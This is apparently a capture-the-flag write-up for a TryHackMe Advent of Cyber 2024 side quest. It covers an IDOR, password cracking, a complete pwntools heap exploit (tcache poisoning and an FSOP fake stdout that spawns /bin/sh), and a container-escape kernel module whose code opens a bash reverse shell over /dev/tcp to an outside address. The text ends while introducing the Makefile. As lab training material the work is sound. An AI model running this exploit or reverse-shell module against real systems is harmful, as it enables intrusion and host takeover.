---
title: "TryHackMe: AoC 2024 Side Quest Three"
author: jaxafed
categories: [TryHackMe]
date: 2025-01-01 00:00:03 +0000
tags: [web, idor, fuzz, pwn, heap, docker, kernel]
render_with_liquid: false
media_subpath: /images/tryhackme_aoc2024_sidequest_three/
image:
  path: room_image.webp
---

**Third Side Quest** started with exploiting an **IDOR** vulnerability on the web application associated with **Advent of Cyber Day 12** to access the details of a transaction that did not belong to us, finding the endpoint for the keycard in the transaction details and using it to disable the firewall.

After that, by fuzzing a web server for directories, we discovered an endpoint with indexing enabled and a couple of files on it: a password list, an executable, and a password-protected archive. Using the executable to convert the passwords in the list, we managed to extract the archive with one of them.

Inside the archive, we found yet another executable, which was running on the target with **socat**. Examining the binary, we noticed a **heap overflow** vulnerability and wrote an exploit to gain a shell inside a container.

Lastly, by loading a kernel module to escape the container, we completed the challenge.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/adventofcyber24sidequest){: .center }

## Finding the Keycard

While solving the `Advent of Cyber Day 12` challenge, we exploit a race condition to perform multiple transactions and transfer more funds than what is available to us, as follows:

![Web 5000 Dashboard](web_5000_dashboard.webp){: width="1200" height="600" }

### Fuzzing For Directories

If we fuzz this web application for directories, we discover the `/transactions` endpoint.

```console
$ ffuf -u 'http://10.10.122.98:5000/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -mc all -t 100 -ic -fc 404
...
transactions            [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 107ms]
```
{: .wrap }

Making a request to the `http://10.10.122.98:5000/transactions` URL, we get a message saying `Transaction ID required`.

![Web 5000 Transactions](web_5000_transactions.webp){: width="1000" height="500" }

Either by fuzzing or just guessing, we see that if we supply the `id` as a `GET` parameter, we receive the `Transaction not found` error.

![Web 5000 Transactions Two](web_5000_transactions2.webp){: width="1000" height="500" }

Since the application gives a valid ID after making a transaction, supplying that in the `id` parameter instead, we receive the details for the transaction.

![Web 5000 Transactions Three](web_5000_transactions3.webp){: width="1000" height="500" }

At this point, we notice that the transaction IDs given seem like an `MD5` hash. Trying to confirm this by cracking it, we can see it is just a sequential number `MD5` hashed.

![Transaction Id Hash](transaction_id_hash.webp){: width="1000" height="400" }

### Fuzzing for Transactions

Knowing this, we can generate a wordlist for all the numbers between `1-1400`, `MD5` hashed as follows:

```console
$ for i in $(seq 1 1400); do echo -n $i | md5sum | cut -d ' ' -f 1 >> transaction_ids.txt; done
```

Now, using this wordlist to fuzz for transaction IDs, we see an interesting response for the `ff49cc40a8890e6a60f40ff3026d2730` transaction ID, which is the `MD5` hash of `1333`.

```console
$ ffuf -u 'http://10.10.122.98:5000/transactions?id=FUZZ' -H 'Cookie: session=eyJuYW1lIjoiZ2xpdGNoIiwidXNlciI6MTAxfQ.Z18RAA.7KsC3ZU-2npLogvEXOuJchNq7yU' -w transaction_ids.txt -mc all -fc 404 -t 100
...
0e55666a4ad822e0e34299df3591d979 [Status: 200, Size: 126, Words: 13, Lines: 7, Duration: 120ms]
28e209b61a52482a0ae1cb9f5959c792 [Status: 200, Size: 129, Words: 13, Lines: 7, Duration: 523ms]
ff49cc40a8890e6a60f40ff3026d2730 [Status: 200, Size: 201, Words: 13, Lines: 7, Duration: 558ms]
9cb67ffb59554ab1dabb65bcb370ddd9 [Status: 200, Size: 128, Words: 13, Lines: 7, Duration: 953ms]
3d779cae2d46cf6a8a99a35ba4167977 [Status: 200, Size: 128, Words: 13, Lines: 7, Duration: 127ms]
c73dfe6c630edb4c1692db67c510f65c [Status: 200, Size: 126, Words: 13, Lines: 7, Duration: 97ms]
8edd72158ccd2a879f79cb2538568fdc [Status: 200, Size: 129, Words: 13, Lines: 7, Duration: 512ms]
```
{: .wrap }

Checking the details for this transaction, we see an interesting `base64` encoded string in the status.

![Web 5000 Transactions Four](web_5000_transactions4.webp){: width="1000" height="500" }

Decoding this string, we are able to discover the endpoint for the keycard.

```console
$ echo 'SGk[REDACTED]ZyA=' | base64 -d
Hi McSkidy <3 /se[REDACTED]37.png
```

Visiting this endpoint on the web application, we find the keycard with the password on it being: `Bl[REDACTED]TW`.

![Web 5000 Keycard](web_5000_keycard.webp){: width="1200" height="600" }

## Side Quest

Just like the second side quest, we start the side quest by going to port `21337` to disable the firewall with the password on the keycard.

![Web 21337 Index](web_21337_index.webp){: width="1200" height="600" }

### Initial Enumeration

We begin with an `nmap` scan.

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.14.175
Nmap scan report for 10.10.14.175
Host is up (0.086s latency).
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3c:a9:48:5e:52:6f:06:d6:3d:82:e9:cc:7b:c9:dd:dc (ECDSA)
|_  256 a6:a1:02:aa:74:d3:f0:5f:41:41:b1:1d:00:f3:31:68 (ED25519)
80/tcp    open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Best Festival Company
1337/tcp  open  waste?
| fingerprint-strings:
|   NULL:
|     ______ _ _ _ ______
|     \x20(_) | | | ___ \x20
|     __________ _ _ __ __| | | |_/ / ___ __ _ _ __
|     \x20| |_ /_ / _` | '__/ _` | | ___ / _ / _` | '__|
|_    ____/|_|_/___/_____,_|_| __,_| ____/ ___|__,_|_|
21337/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.10.12)
|_http-title: Your Files Have Been Encrypted
|_http-server-header: Werkzeug/2.0.2 Python/3.10.12
...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are three relevant ports open:

- **22** (`SSH`)
- **80** (`HTTP`)
- **1337**

Visiting `http://10.10.14.175/`, we see a site for submitting approval requests.

![Web 80 Index](web_80_index.webp){: width="1200" height="600" }

Connecting to port `1337` with `netcat`, we see a custom application for managing permits.

```console
$ nc 10.10.14.175 1337
...
[1] Create Permit Entry
[2] Read Permit Entry
[3] Edit Permit Entry
[4] Exit Permit Manager
>>
```

### First Flag

Fuzzing the web server for directories, we discover an interesting directory: `/backup`.

```console
$ ffuf -u 'http://10.10.14.175/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -mc all -t 100 -ic -fc 404
...
backup                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 121ms]
```
{: .wrap }

Visiting `http://10.10.14.175/backup/`, we see that indexing is enabled and there are three files.

![Web 80 Backup](web_80_backup.webp){: width="1200" height="600" }

We proceed by downloading these files.

```console
$ wget -q http://10.10.14.175/backup/enc
$ wget -q http://10.10.14.175/backup/recommended-passwords.txt
$ wget -q http://10.10.14.175/backup/secure-storage.zip
```

- First, we have an executable called `enc`.

```console
$ file enc
enc: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=af624dc12c4b7b3ec778e8777c3b4d275059995a, for GNU/Linux 3.2.0, not stripped
```
{: .wrap }

- Second, we have a list of passwords in the `recommended-passwords.txt` file.

```console
$ head recommended-passwords.txt
B3st00uopElite
B3st0AY2r!
B3st0AayiElite
B3st0AgBrElite
B3st0AyDXQueen
B3st0AyOjElite
B3st0Lco4Elite
B3st0PYLqElite
B3st0aVzrKing
B3st0aYoRElite
```

- Third, we have a password-protected **ZIP** archive named `secure-storage.zip` containing some files.

```console
$ zipinfo secure-storage.zip
Archive:  secure-storage.zip
Zip file size: 4804976 bytes, number of entries: 6
drwxrwxr-x  6.3 unx        0 bx stor 24-Dec-05 23:30 secure-storage/
-rwxr-xr-x  6.3 unx      758 Bx u099 24-Nov-14 20:23 secure-storage/Dockerfile
-rw-rw-r--  6.3 unx       32 Bx u099 24-Dec-05 04:26 secure-storage/foothold.txt
-rwxr-xr-x  6.3 unx   236616 Bx u099 24-Nov-14 20:15 secure-storage/ld-linux-x86-64.so.2
-rwxr-xr-x  6.3 unx  6228984 Bx u099 24-Nov-14 20:15 secure-storage/libc.so.6
-rwxrwxr-x  6.3 unx    24600 Bx u099 24-Dec-05 23:30 secure-storage/secureStorage
6 files, 6490990 bytes uncompressed, 4803804 bytes compressed:  26.0%
```

If we try to use `zip2john` for `secure-storage.zip` and crack the produced hash using `recommended-passwords.txt` as the wordlist, we are unsuccessful. So, let's open the `enc` executable in **Ghidra** to see what it does.

Checking the `main` function, we can see that it first checks if a command-line argument is passed to the executable, and if not, it exits. Then, it calls the `obx` function with the command-line argument and `2`. After that, it also calls the `obh` function with the command-line argument and another argument. Finally, it prints the second argument passed to the function in **hex**.

![Ghidra Enc Main](ghidra_enc_main.webp){: width="600" height="600" }

Checking the `obx` function, we can see that it `XOR`'s the first argument passed with the second argument (`2` in this case) and overwrites the first argument with it.

![Ghidra Enc Obx](ghidra_enc_obx.webp){: width="600" height="250" }

Checking the `obh` function, we can see that it `MD5` hashes the first argument and saves it in the second argument.

![Ghidra Enc Obh](ghidra_enc_obh.webp){: width="600" height="400" }

To summarize, the application reads a string from the command-line argument, `XOR`'s it with `2`, `MD5` hashes the result, and prints it.

Knowing this, we can write a script to perform the same steps for the passwords in `recommended-passwords.txt` to generate a wordlist. Alternatively, we can also use the executable to achieve the same goal, as follows:

```
$ chmod +x enc
$ for i in $(cat recommended-passwords.txt); do ./enc $i >> enc-passwords.txt; done
```

Using this new wordlist to discover the password for the **ZIP** file, we are successful.

```console
$ zip2john secure-storage.zip > secure-storage.hash
$ john secure-storage.hash --wordlist=enc-passwords.txt
...
30[REDACTED]7b (secure-storage.zip/secure-storage/secureStorage)
30[REDACTED]7b (secure-storage.zip/secure-storage/libc.so.6)
30[REDACTED]7b (secure-storage.zip/secure-storage/Dockerfile)
30[REDACTED]7b (secure-storage.zip/secure-storage/ld-linux-x86-64.so.2)
30[REDACTED]7b (secure-storage.zip/secure-storage/foothold.txt)
...
```

Extracting the archive with the password, we find the first flag inside the `secure-storage/foothold.txt` file.

```console
$ 7z x secure-storage.zip -p30[REDACTED]7b
$ wc -c secure-storage/foothold.txt
32 secure-storage/foothold.txt
```

### Second Flag

Apart from the flag, the `secure-storage` folder also has the `ld-linux-x86-64.so.2` and `libc.so.6` files, which the `secureStorage` executable uses, and a `Dockerfile` that sets up a container to run the `secureStorage` executable on port `1337` with `socat`. This seems to be the application running on port `1337` on the target. 

So, let's start by opening the executable in **Ghidra** to examine what it does.

Checking the `main` function, it simply calls the `menu` function in an infinite loop to print the menu. After that, it reads an option from the user, and depending on the option chosen, it either exits or calls one of the `create`, `edit`, or `show` functions.

![Ghidra Securestorage Main](ghidra_securestorage_main.webp){: width="400" height="500" }

Starting with the `create` function, it first asks for the index of the entry and checks if the index is smaller than 32 and that the index in the `chunks` array is not yet set. After that, it asks for the size and checks if the size is not 0 and smaller than `0x1001`. If so, it calls the `malloc` function to allocate memory with that size. Then, it asks for the data for the entry and uses the `read` function to read the size given plus 16 bytes from **stdin** into the allocated memory. 

The vulnerability in the application lies here, where it allows us to write 16 bytes past the allocated memory.

![Ghidra Securestorage Create](ghidra_securestorage_create.webp){: width="600" height="600" }

Checking the `edit` function next, it is similar to the `create` function. It asks for the index of the entry we want to modify and then asks for the data. Like the `create` function, it reads 16 bytes more than the allocated memory size.

![Ghidra Securestorage Edit](ghidra_securestorage_edit.webp){: width="750" height="350" }

Lastly, checking the `show` function, it simply uses `puts` to print the entry.

![Ghidra Securestorage Show](ghidra_securestorage_show.webp){: width="550" height="300" }

Also, checking the protections for the binary, we can see that everything is enabled.

```console
$ checksec secureStorage
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
```

Now that we have examined the binary and discovered the vulnerability in it, it seems we need to use the extra `16-byte` write we have for a heap exploit to get a shell.

> Before moving on to the exploit, I highly recommend checking out [this write-up for the **high frequency troubles** challenge from **picoCTF 2024**](https://hackmd.io/@Zzzzek/r14x13FRp#high-frequency-troubles). My exploit is basically just an adaptation of the solution mentioned there.  
{: .prompt-tip }

Let's start with a basic template and write a couple of helper functions to make it easier to interact with the program, as follows:

```py
#!/usr/bin/env python3

from pwn import *

context.update(arch="amd64", os="linux", log_level="debug")
context.binary = elf = ELF("./secureStorage", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

r = process()
gdb.attach(r)

def add(index, size, content):
    r.sendlineafter(b'\n>> ', b'1')
    r.sendlineafter(b'Enter permit index:\n', str(index).encode())
    r.sendlineafter(b'Enter entry size:\n', str(size).encode())
    r.sendlineafter(b'Enter entry data:\n', content)

def show(index):
    r.sendlineafter(b'\n>> ', b'2')
    r.sendlineafter(b'Enter entry index:\n', str(index).encode())

def edit(index, content):
    r.sendlineafter(b'\n>> ', b'3')
    r.sendlineafter(b'Enter entry index:\n', str(index).encode())
    r.sendlineafter(b'Enter data:\n', content)

r.interactive()
```

First of all, to have a chance of turning this heap exploit into remote code execution, we need to be able to leak addresses from the program. For that, we need to be able to free chunks. Since the program does not allow us to call the `free` function directly, we can use an indirect method like the one from the [`House of Orange`](https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/house_of_orange/) exploit.

Basically, we can use the `16-byte` overflow we have to overwrite the chunk metadata. In this case, we can use it to overwrite the size of the top chunk, making it a lot smaller than it currently is. After that, if we try to allocate a chunk larger than the top chunk size, the heap will be expanded, and the original top chunk will be freed and placed in an unsorted bin.

For this, let's start by modifying our exploit to allocate a chunk of size `352` and inspect the state of the heap in the debugger.

```py
...
add(0, 352, b"A"*8)
r.interactive()
``` 

As we can see, our allocated chunk is at `0x000055c5cfdd42a0`. Right after that, there is the top chunk, and its size is `0x20c01` (with the last bit set to indicate that the previous chunk is in use).

```console
gef➤  x/gx &chunks
0x55c5ce736060 <chunks>:        0x000055c5cfdd42a0
gef➤  x/2gx 0x000055c5cfdd42a0+352
0x55c5cfdd4400: 0x0000000000000000      0x0000000000020c01
gef➤  heap chunks
Chunk(addr=0x55c5cfdd4010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055c5cfdd4010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55c5cfdd42a0, size=0x170, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055c5cfdd42a0     41 41 41 41 41 41 41 41 0a 00 00 00 00 00 00 00    AAAAAAAA........]
Chunk(addr=0x55c5cfdd4410, size=0x20c00, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
```

Knowing this, we can now edit the chunk we allocated and use the `16-byte` write past the allocated memory to overwrite the chunk size with `0xc01` (we need to keep the lower bits the same for page alignment). We can modify our script as follows:

```py
...
edit(0, b"A"*352 + p64(0) + p64(0xc01))
r.interactive()
```

We see that with this, we are able to overwrite the top chunk size successfully.

```console
gef➤  heap chunks
Chunk(addr=0x55de47036010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055de47036010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55de470362a0, size=0x170, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055de470362a0     41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41    AAAAAAAAAAAAAAAA]
Chunk(addr=0x55de47036410, size=0xc00, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
gef➤  x/gx 0x55de470362a0+360
0x55de47036408: 0x0000000000000c01
```

Now, following our plan, if we allocate a chunk larger than the top chunk size, we should see that the original top chunk is freed and placed into an unsorted bin.

```py
...
add(1, 0x1000, b"A"*8)
r.interactive()
```

We can see that this works, as the original top chunk is now in the unsorted bins.

```console
gef➤  heap bins unsorted
────────────────────────────────────────── Unsorted Bin for arena at 0x7fe8a7603ac0 ──────────────────────────────────────────
[+] unsorted_bins[0]: fw=0x55f7191a2400, bk=0x55f7191a2400
 →   Chunk(addr=0x55f7191a2410, size=0xbe0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
```

Now, if we allocate a new chunk, since there is a chunk in the unsorted bin, we will cut that.

```py
...
add(2, 64, b"A")
r.interactive()
```

Not only do we see that this is the case, but we can also observe that the unsorted bin list is not cleared, and there are still some pointers left in the chunk.

```console
gef➤  heap bins unsorted
────────────────────────────────────────── Unsorted Bin for arena at 0x7f514c203ac0 ──────────────────────────────────────────
[+] unsorted_bins[0]: fw=0x55e0e93da450, bk=0x55e0e93da450
 →   Chunk(addr=0x55e0e93da460, size=0xb90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
gef➤  x/gx (void *)&chunks+0x10
0x55e0e8e4a070 <chunks+16>:     0x000055e0e93da410
gef➤  x/4gx 0x000055e0e93da410
0x55e0e93da410: 0x00007f514c200a41      0x00007f514c204100
0x55e0e93da420: 0x000055e0e93da400      0x000055e0e93da400
```

As we can see in our newly allocated chunk, after **8 bytes**, there is a pointer to the **libc**, and after **16 bytes**, there is a pointer to the **heap**, which we can use to calculate the base addresses for both the **heap** and **libc**.

```console
gef➤  vmmap heap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x000055e0e93da000 0x000055e0e941d000 0x0000000000000000 rw- [heap]
gef➤  p/x 0x000055e0e93da400-0x000055e0e93da000
$1 = 0x400
gef➤  vmmap libc
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x00007f514c000000 0x00007f514c028000 0x0000000000000000 r-- ./libc.so.6
...
gef➤  p/x 0x00007f514c204100-0x00007f514c000000
$2 = 0x204100
```

And when it comes to leaking these addresses, we can use the `show` function. However, since it uses `puts`, which will stop when encountering a null byte, we first need to overwrite the part before the addresses with non-zero values.

First, we leak the **libc** address:

```py
...
edit(2, b"A"*8)
show(2)
r.interactive()
```

As we can see, this works. However, there is one small problem: we also need to overwrite the last bytes of the addresses to leak since they are null bytes. But we can fix this easily by accounting for it when parsing the leaked addresses, as follows:

![Securestorage Address Leak](securestorage_address_leak.webp){: width="1200" height="300" }

```py
...
libc_leak = u64(r.recvuntil(b"\n[1]")[-9:-4].ljust(8, b"\x00")) * 256 # to account for overwritten null byte
print(f"[+] Libc Leak: {hex(libc_leak)}")
libc_base = libc_leak - 0x204100
print(f"[+] Libc Base : {hex(libc_base)}")
edit(2, b"A"*16)
```

Next, we can use the same method to leak the **heap** address, parse the leak, and calculate the **heap** base address.

```py
...
edit(2, b"A"*16)
show(2)
heap_leak = u64(r.recvuntil(b"\n[1]")[-9:-4].ljust(8, b"\x00")) * 256 # to account for overwritten null byte
print(f"[+] Heap Leak: {hex(heap_leak)}")
heap_base = heap_leak - 0x400
print(f"[+] Heap Base : {hex(heap_base)}")
r.interactive()
```

Now that we have the leaks, to turn it into a shell, we can use the method mentioned [here](https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc/#3---the-fsop-way-targetting-stdout) of overwriting the `stdout` with a fake file structure we create.

But to be able to overwrite the `stdout`, we first need to make `malloc` return a pointer to it. One way we can achieve this is using `tcache poisoning`. Essentially, we will use our `16-byte` overflow to overwrite the forward pointer with the address we want to write to in one of the `tcaches`. After that, allocating new memory with the size of that `tcache` will cause our next allocated `tcache` with the same size to be at the address we want to write.

For this, first, we need to free two chunks so they are placed in the `tcache bin`, which we can achieve using the same method of overwriting the top chunk size, as follows:

```py
...
add(3, 0xd98, b"A"*0xd98 + p64(0x251))
add(4, 0xda8, b"A"*0xda8 + p64(0x251))
add(5, 0x1000, b"A")
r.interactive()
```

As we can see, this works, and now we have two `tcache bins` with size `0x230`. Additionally, the last freed `tcache` is right after the memory we allocated with the 4th index, with `0x231` being the size (the last bit indicates the previous chunk is in use), and the forward pointer being `0x00005644a3616a32`.

```console
gef➤  heap bins tcache
────────────────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────────────────
Tcachebins[idx=33, size=0x230, count=2] ←  Chunk(addr=0x5641c77f2dc0, size=0x230, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  
←  Chunk(addr=0x5641c77d1dc0, size=0x230, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
gef➤  x/gx (void *)&chunks+0x20
0x5641c6d3c080 <chunks+32>:     0x00005641c77f2010
gef➤  x/4gx 0x00005641c77f2010+0xda0
0x5641c77f2db0: 0x4141414141414141      0x0000000000000231
0x5641c77f2dc0: 0x00005644a3616a32      0xb581f82da5a0e2a9
```

At this point, you might notice that the forward pointer (`0x5644a3616a32`) does not match the address of the next `tcache` (`0x5641c77d1dc0`).

This is due to the fact that in newer versions of **libc**, the forward pointer is encrypted with the address of the last freed chunk, in this case `0x5641c77f2dc0`. We can perform the same encryption as follows and confirm that this is indeed the case:

```console
>>> last_addr = 0x5641c77f2dc0
>>> next_addr = 0x5641c77d1dc0
>>> hex(next_addr ^ last_addr >> 12)
'0x5644a3616a32'
```

Due to this, while overwriting the forward pointer with the address of the `stdout`, we also need to encrypt it in the same way. To achieve this, we can calculate the address of the last freed chunk using the **heap** base address we leaked.

```console
gef➤  vmmap heap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x00005641c77af000 0x00005641c77f2000 0x0000000000000000 rw- [heap]
gef➤  p/x 0x5641c77f2dc0-0x00005641c77af000
$1 = 0x43dc0
```

With this, we can overwrite the forward pointer with the encrypted address of the `stdout`, as follows:

```py
...
libc.address = libc_base
stdout = libc.sym['_IO_2_1_stdout_']
last_addr = heap_base + 0x43dc0
stdout_enc = stdout ^ last_addr >> 12
edit(4, b"A"*0xda8 + p64(0x231) + p64(stdout_enc))
r.interactive()
```

As we can see, we are successful with this, as now the first freed `tcache` seems to be at `stdout` due to the overwritten forward pointer in the last freed `tcache`.

```console
gef➤  heap bins tcache
────────────────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────────────────
Tcachebins[idx=33, size=0x230, count=2] ←  Chunk(addr=0x56445a218dc0, size=0x230, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  
←  Chunk(addr=0x7fde54a045c0, size=0x7fde54a02030, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  [Corrupted chunk at 0x7fde54a045c0]
gef➤  x/gx 0x7fde54a045c0
0x7fde54a045c0 <_IO_2_1_stdout_>:       0x00000000fbad2887
```


Next, we can allocate two new chunks with size `0x228`, since while the chunk sizes for the `tcaches` are `0x230`, `8` bytes are needed for the metadata, so the usable size for them is `0x228` and we want our allocation to return these free `tcache` bins.

```py
...
add(6, 0x228, b"A")
add(7, 0x228, b"A")
r.interactive()
```

If we set a breakpoint in the `create` function while running this script and observe the pointer returned for our allocation with the index as `7`, we can see that we are successful, as it returns a pointer to the `stdout`, and we can see that we were even able to write to it.

```console
gef➤  x/gx (void *)&chunks+0x38
0x56295fe2a098 <chunks+56>:     0x00007f1c1b2045c0
gef➤  x/gx 0x00007f1c1b2045c0
0x7f1c1b2045c0 <_IO_2_1_stdout_>:       0x00000000fbad0a41
```

Next, we can move on to creating our fake file structure. We already have pretty much everything we need for it; we only need to find the address of an `add rdi, 0x10 ; jmp rcx` gadget in the **libc**, which we can do using `ropper` as follows:

```console
$ ropper -f libc.so.6 --search 'add rdi, 0x10; jmp rcx'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: add rdi, 0x10; jmp rcx

[INFO] File: libc.so.6
0x00000000001724f0: add rdi, 0x10; jmp rcx;
```

Now we can create our fake file structure as follows:

```py
...
fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end = libc.sym['system']
fake._IO_save_base = libc.address + 0x1724f0  # add rdi, 0x10 ; jmp rcx
fake._IO_write_end = u64(b'/bin/sh'.ljust(8,b'\x00'))
fake._lock = libc.sym['_IO_stdfile_1_lock']
fake._codecvt = stdout + 0xb8
fake._wide_data = stdout + 0x200
fake_vtable = libc.sym['_IO_wfile_jumps'] - 0x18
fake.unknown2 = p64(0)*2 + p64(stdout+0x20) + p64(0)*3 + p64(fake_vtable)
...
```

At last, all we have to do is write the `stdout` with our file structure by editing the entry at the `7th` index with it, as follows:

```py
...
edit(7, bytes(fake))
r.interactive()
```

As we can see, using the script, we are able to get a shell locally.

```console
$ python3 exploit.py
[+] Libc Leak: 0x7fe9f1804100
[+] Libc Base : 0x7fe9f1600000
[+] Heap Leak: 0x55fc7c6d3400
[+] Heap Base : 0x55fc7c6d3000
$ whoami
kali
```

> At this point, I simply tried editing the script to run it against the target, but encountered a strange issue where running the script from my own VM would cause the executable on the target to spam the menu forever. But running it from the `AttackBox` provided by `TryHackMe` works fine. So, I recommend you do the same. Also, if you know the reason for it, please let me know.  
{: .prompt-danger }

Now, we can simply modify it to run against the target as follows, and here is the full script:

```py
#!/usr/bin/env python3

from pwn import *

context.update(arch="amd64", os="linux", log_level="debug")
context.binary = elf = ELF("./secureStorage", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

r = remote("10.10.14.175", 1337)

def add(index, size, content):
    r.sendlineafter(b'\n>> ', b'1')
    r.sendlineafter(b'Enter permit index:\n', str(index).encode())
    r.sendlineafter(b'Enter entry size:\n', str(size).encode())
    r.sendlineafter(b'Enter entry data:\n', content)

def show(index):
    r.sendlineafter(b'\n>> ', b'2')
    r.sendlineafter(b'Enter entry index:\n', str(index).encode())

def edit(index, content):
    r.sendlineafter(b'\n>> ', b'3')
    r.sendlineafter(b'Enter entry index:\n', str(index).encode())
    r.sendlineafter(b'Enter data:\n', content)

add(0, 352, b"A"*8)
edit(0, b"A"*352 + p64(0) + p64(0xc01))
add(1, 0x1000, b"A"*8)
add(2, 64, b"A")
edit(2, b"A"*8)
show(2)
libc_leak = u64(r.recvuntil(b"\n[1]")[-9:-4].ljust(8, b"\x00")) * 256 # to account for overwritten null byte
print(f"[+] Libc Leak: {hex(libc_leak)}")
libc_base = libc_leak - 0x204100
print(f"[+] Libc Base : {hex(libc_base)}")
edit(2, b"A"*16)
show(2)
heap_leak = u64(r.recvuntil(b"\n[1]")[-9:-4].ljust(8, b"\x00")) * 256 # to account for overwritten null byte
print(f"[+] Heap Leak: {hex(heap_leak)}")
heap_base = heap_leak - 0x400
print(f"[+] Heap Base : {hex(heap_base)}")

add(3, 0xd98, b"A"*0xd98 + p64(0x251))
add(4, 0xda8, b"A"*0xda8 + p64(0x251))
add(5, 0x1000, b"A")

libc.address = libc_base
stdout = libc.sym['_IO_2_1_stdout_']
last_addr = heap_base + 0x43dc0
stdout_enc = stdout ^ last_addr >> 12
edit(4, b"A"*0xda8 + p64(0x231) + p64(stdout_enc))

add(6, 0x228, b"A")
add(7, 0x228, b"A")

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end = libc.sym['system']
fake._IO_save_base = libc.address + 0x1724f0  # add rdi, 0x10 ; jmp rcx
fake._IO_write_end = u64(b'/bin/sh'.ljust(8,b'\x00'))
fake._lock = libc.sym['_IO_stdfile_1_lock']
fake._codecvt = stdout + 0xb8
fake._wide_data = stdout + 0x200
fake_vtable = libc.sym['_IO_wfile_jumps'] - 0x18
fake.unknown2 = p64(0)*2 + p64(stdout+0x20) + p64(0)*3 + p64(fake_vtable)

edit(7, bytes(fake))
r.interactive()
```
{: file="exploit.py" }

Running the script, we are able to get a shell as `root` inside the container and can read the second flag at `/root/user.txt`.

```console
root@ip-10-10-144-85:~# python3 exploit.py
[+] Libc Leak: 0x7b7edaf61100
[+] Libc Base : 0x7b7edad5d000
[+] Heap Leak: 0x5db2420ed400
[+] Heap Base : 0x5db2420ed000
$ id
uid=0(root) gid=0(root) groups=0(root)
$ wc -c user.txt
66 user.txt
```

### Third Flag

Checking our capabilities inside the container, we can see that we have the `cap_sys_module` capability.

```console
root@a8fc621bec0b:~# capsh --print
Current: =ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
Ambient set =
Current IAB:
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=0(root) euid=0(root)
gid=0(root)
groups=0(root)
Guessed mode: UNCERTAIN (0)
```

The `cap_sys_module` allows us to load kernel modules, and since containers share the host's kernel, we can use this to gain a shell on the host.

First, we create our malicious kernel module to run a reverse shell payload, as follows:

```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kmod.h>

MODULE_LICENSE("GPL");

static int shell(void){
	char *argv[] ={"/bin/bash", "-c", "bash -i >& /dev/tcp/10.11.72.22/443 0>&1", NULL};
	static char *env[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}

static int init_mod(void){
	return shell();
}

static void exit_mod(void){
	return;
}

module_init(init_mod);
module_exit(exit_mod);
```
{: file="shell.c" }

We create the `Makefile` for it.

```make
